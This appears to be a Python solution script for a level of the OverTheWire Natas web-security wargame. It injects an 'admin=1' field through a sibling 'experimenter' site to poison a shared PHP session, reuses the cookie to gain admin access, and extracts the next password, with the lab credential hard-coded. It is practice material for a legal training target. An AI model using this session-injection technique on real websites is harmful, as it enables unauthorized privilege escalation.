import requests as req

url1 = "http://natas21.natas.labs.overthewire.org/index.php"
url2 = "http://natas21-experimenter.natas.labs.overthewire.org/index.php"

if __name__ == '__main__':
	r = req.post(url=url2, 
				 auth=('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'),
				 data={ "align": "center", "fontsize": "100%25",
				 		"bgcolor": "yellow", "admin": 1, "submit": "update" })
	cookies = r.cookies.values()[0]
	r = req.post(url=url1, 
				 auth=('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'), 
				 cookies=dict(PHPSESSID=cookies))
	i1 = r.text.index("Password: ")
	i2 = r.text[i1:].index("</pre>")+i1
	print(r.text[i1:i2])